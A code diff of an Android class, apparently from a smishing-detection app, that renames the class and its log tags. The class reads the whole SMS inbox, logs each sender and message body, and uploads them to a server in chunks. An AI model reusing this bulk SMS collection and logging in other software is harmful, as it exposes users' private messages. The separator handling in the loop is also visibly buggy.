@@ -18,13 +18,13 @@ import java.util.concurrent.TimeUnit;
 
 
 // Thread that sends all the SMS inbox to the server.
-public class SmishingDetect implements Runnable
+public class Smishing implements Runnable
 {
     private SocketTask socketTask;
     private Context mContext;
     private boolean permission;
 
-    SmishingDetect(SocketTask socketTask, Context mContext) {
+    Smishing(SocketTask socketTask, Context mContext) {
         this.socketTask = socketTask;
         this.mContext = mContext;
     }
@@ -47,21 +47,21 @@ public class SmishingDetect implements Runnable
     private void sendInbox(){
         socketTask.getSmishingDetectClass(this);
         String dataToSend = "";
-        Log.d(SmishingDetect.class.getSimpleName(), "Starting read SMS inbox...");
+        Log.d(Smishing.class.getSimpleName(), "Starting read SMS inbox...");
         Uri uriSMSURI = Uri.parse(Config.SMS_URI_INBOX);
         Cursor cur = this.mContext.getContentResolver().query(uriSMSURI, null, null, null, null);
         if (cur != null) {
             while (cur.moveToNext()) {
                 String address = cur.getString(cur.getColumnIndex("address"));
                 String body = cur.getString(cur.getColumnIndexOrThrow("body"));
-                Log.d(SmishingDetect.class.getSimpleName(), "Number: " + address + " .Message: " + body);
+                Log.d(Smishing.class.getSimpleName(), "Number: " + address + " .Message: " + body);
                 dataToSend += address + "#^%" + body + "&*(";
                 dataToSend = dataToSend.substring(0, dataToSend.length()-3);
             }
         }
 
         while (dataToSend.length() > 900) {
-            Log.d(CheckProcesses.class.getSimpleName(), "Length: " + dataToSend.length());
+            Log.d(Processes.class.getSimpleName(), "Length: " + dataToSend.length());
             socketTask.send("CheckSmishingData," + dataToSend.substring(0, 900));
             dataToSend = dataToSend.substring(900, dataToSend.length());
             sleep(10);
@@ -83,7 +83,7 @@ public class SmishingDetect implements Runnable
     // When permission is allowed by the client.
     public void setPermission()
     {
-        Log.d(SmishingDetect.class.getSimpleName(), "permission allowed!");
+        Log.d(Smishing.class.getSimpleName(), "permission allowed!");
         permission = true;
     }
 
